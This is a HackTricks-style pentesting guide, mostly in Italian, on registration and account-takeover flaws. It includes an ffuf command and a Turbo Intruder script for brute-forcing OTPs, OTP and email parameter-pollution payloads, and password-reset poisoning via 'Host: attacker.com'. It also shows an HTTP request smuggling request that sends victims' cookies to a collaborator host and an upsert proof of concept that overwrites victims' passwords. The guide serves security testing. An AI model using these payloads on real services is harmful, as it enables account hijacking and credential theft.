# Registrazione e Vulnerabilità di Takeover

{{#include ../banners/hacktricks-training.md}}

## Takeover tramite registrazione

### Registrazione duplicata

- Prova a generare usando un username esistente
- Verifica variando la email:
- uppercase
- +1@
- aggiungi qualche dot nell'email
- caratteri speciali nel nome dell'email (%00, %09, %20)
- Metti caratteri neri dopo l'email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Prova trucchi di canonicalization del provider email (dipende dal servizio):
- Gmail ignores dots and subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` deliver to `victim@gmail.com`
- Alcuni provider sono case-insensitive nella local-part
- Alcuni provider accettano unicode confusables. Prova homoglyphs e soft hyphen `\u00AD` all'interno della local-part
- Abusa di questi per: bypassare i controlli di unicità, ottenere account/workspace invite duplicati, o bloccare le registrazioni della vittima (DoS temporaneo) mentre prepari un takeover

### Username Enumeration

Verifica se riesci a capire quando uno username è già stato registrato nell'applicazione.

- Differenti messaggi di errore o codici di stato HTTP
- Differenze di timing (l'utente esistente potrebbe attivare lookup verso IdP/DB)
- Autofill del form di registrazione dei dati del profilo per email conosciute
- Controlla i flussi team/invite: inserire un'email può rivelare se esiste un account

### Password Policy

Creando un utente verifica la password policy (controlla se puoi usare password deboli).\
In quel caso puoi provare a bruteforceare le credenziali.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

Quando sei registrato prova a cambiare l'email e verifica se questo cambiamento è correttamente validato o se puoi impostarla su email arbitrarie.

### More Checks

- Controlla se puoi usare **disposable emails** (mailinator, yopmail, 1secmail, etc.) o bypassare la blocklist con subaddressing come `victim+mailinator@gmail.com`
- **Long** **password** (>200) può portare a **DoS**
- **Controlla i rate limits sulla creazione di account**
- Usa username@**burp_collab**.net e analizza il **callback**
- Se viene usata la verifica via numero di telefono, controlla edge case di parsing/injection del telefono

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

## Weak Email/Phone Verification (OTP/Magic Link)

I flussi di registrazione spesso verificano la proprietà tramite un OTP numerico o un token magic-link. Difetti tipici:

- OTP indovinabile o corto (4–6 cifre) senza rate limiting efficace o tracciamento IP/device. Prova tentativi paralleli e rotazione header/IP.
- Riutilizzo dell'OTP tra azioni o account, o non vincolato all'utente/azione specifica (es., lo stesso codice funziona per login e signup, o funziona dopo il cambio email).
- Multi-value smuggling: alcuni backend accettano più codici e verificano se uno corrisponde. Prova:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Valori separati da virgola/pipe: `code=000000,123456` o `code=000000|123456`
- Oracle di risposta: distingui wrong vs expired vs wrong-user codes tramite status/messaggio/lunghezza del body.
- Token non invalidati dopo il successo o dopo il cambio di password/email.
- Verification token non legato a user agent/IP permettendo il completamento cross-origin da pagine controllate dall'attaccante.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Indovinamenti paralleli/concurrenti per aggirare lockout sequenziali (usa Turbo Intruder in Burp):

<details>
<summary>Snippet di Turbo Intruder per inviare in massa tentativi OTP a 6 cifre</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)

def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: submit the same valid OTP simultaneously in two sessions; sometimes one session becomes a verified attacker account while the victim flow also succeeds.
- Testa anche Host header poisoning sui link di verifica (come reset poisoning qui sotto) per leak o per completare la verifica su un host controllato dall'attaccante.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Una potente classe di problemi si verifica quando un attaccante esegue azioni sulla email della vittima prima che questa crei il proprio account, per poi riprendere l'accesso in un secondo momento.

Key techniques to test (adatta ai flussi del target):

- Classic–Federated Merge
- Attaccante: registra un account classic con l'email della vittima e imposta una password
- Vittima: successivamente si iscrive con SSO (stessa email)
- Merge insicuri possono lasciare entrambe le parti loggate o far riemergere l'accesso dell'attaccante
- Unexpired Session Identifier
- Attaccante: crea l'account e mantiene una sessione long‑lived (non effettuare il logout)
- Vittima: recupera/imposta la password e usa l'account
- Verifica se le vecchie sessioni restano valide dopo il reset o l'abilitazione di MFA
- Trojan Identifier
- Attaccante: aggiunge un identificatore secondario all'account creato in anticipo (telefono, email aggiuntiva, o collega l'IdP dell'attaccante)
- Vittima: resetta la password; l'attaccante successivamente usa il trojan identifier per resettare/loggare
- Unexpired Email Change
- Attaccante: avvia una modifica email verso un indirizzo controllato dall'attaccante e non conferma
- Vittima: recupera l'account e inizia a usarlo
- Attaccante: completa in seguito la pending email‑change per rubare l'account
- Non‑Verifying IdP
- Attaccante: usa un IdP che non verifica la proprietà dell'email per affermare `victim@…`
- Vittima: si registra tramite il percorso classic
- Il servizio esegue merge basandosi sull'email senza controllare `email_verified` o eseguire una verifica locale

Suggerimenti pratici

- Raccogli i flussi e gli endpoint da web/mobile bundles. Cerca classic signup, SSO linking, email/phone change e password reset endpoints.
- Crea automazioni realistiche per mantenere le sessioni attive mentre testi altri flussi.
- Per i test SSO, metti su un test OIDC provider e emetti token con claim `email` per l'indirizzo della vittima e `email_verified=false` per verificare se il RP si fida di IdP non verificati.
- Dopo ogni password reset o email change, verifica che:
  - tutte le altre sessioni e token siano invalidati,
  - le capacità di pending email/phone change siano cancellate,
  - IdP/email/phone precedentemente collegati vengano ri‑verificati.

Nota: Metodologia estesa e case study di queste tecniche sono documentati nella ricerca di Microsoft sul pre‑hijacking (vedi References alla fine).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address  
2. Click on the password reset link  
3. Don’t change password  
4. Click any 3rd party websites(eg: Facebook, twitter)  
5. Intercept the request in Burp Suite proxy  
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite  
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`  
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`  
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR sui parametri API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. L'attaccante deve autenticarsi con il proprio account e andare alla funzionalità **Change password**.
2. Avvia Burp Suite e intercetta la richiesta
3. Inviala alla scheda Repeater e modifica i parametri: User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Token di reset della password debole <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Il token di reset della password dovrebbe essere generato in modo casuale e unico ogni volta.\
Cerca di determinare se il token scade o se è sempre lo stesso; in alcuni casi l'algoritmo di generazione è debole e può essere indovinato. Le seguenti variabili potrebbero essere usate dall'algoritmo.

- Timestamp
- UserID
- Email dell'utente
- Nome e cognome
- Data di nascita
- Crittografia
- Solo numeri
- Piccola sequenza di token (caratteri tra \[A-Z,a-z,0-9])
- Riutilizzo del token
- Data di scadenza del token

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Genera una richiesta di reset password usando l'API/UI per una email specifica, es.: test@mail.com
2. Ispeziona la risposta del server e controlla per `resetToken`
3. Quindi usa il token in un URL come `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Reset della password tramite collisione di username <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registrati sul sistema con uno username identico a quello della vittima, ma con spazi inseriti prima e/o dopo lo username. es.: `"admin "`
2. Richiedi un reset della password con il tuo username creato in modo maligno.
3. Usa il token inviato alla tua email e resetta la password della vittima.
4. Accedi all'account della vittima con la nuova password.

La piattaforma CTFd era vulnerabile a questo attacco.\
Vedi: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover tramite Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Trova una XSS all'interno dell'applicazione o in un sottodominio se i cookie sono impostati per il dominio principale: `*.domain.com`
2. Leak the current **sessions cookie**
3. Autenticati come l'utente usando il cookie

### Account Takeover tramite HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Usa **smuggler** per rilevare il tipo di HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Prepara una richiesta che sovrascriverà il `POST / HTTP/1.1` con i seguenti dati:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` con l'obiettivo di aprire un redirect delle vittime verso burpcollab e rubare i loro cookie\
3. La richiesta finale potrebbe essere simile alla seguente
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone reports exploiting this bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Compromissione dell'account via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Crea un payload per il CSRF, es.: “HTML form con invio automatico per il cambio password”
2. Invia il payload

### Compromissione dell'account via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token potrebbe essere usato per autenticare un utente.

- Modifica il JWT con un altro User ID / Email
- Controlla la presenza di una firma JWT debole


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert su email esistente)

Alcuni handler di signup eseguono un upsert quando l'email fornita esiste già. Se l'endpoint accetta un body minimo con email e password e non verifica la proprietà, inviare l'email della vittima sovrascriverà la sua password prima dell'autenticazione.

- Scoperta: raccogli i nomi degli endpoint dal JS bundlato (o dal traffico dell'app mobile), poi fai fuzz sui percorsi base come /parents/application/v4/admin/FUZZ usando ffuf/dirsearch.
- Suggerimenti sul metodo: un GET che ritorna messaggi come "Only POST request is allowed." spesso indica il verbo corretto e che è atteso un body JSON.
- Body minimo osservato in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Esempio PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Impatto: Full Account Takeover (ATO) senza alcun reset token, OTP o email verification.

## References

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

{{#include ../banners/hacktricks-training.md}}
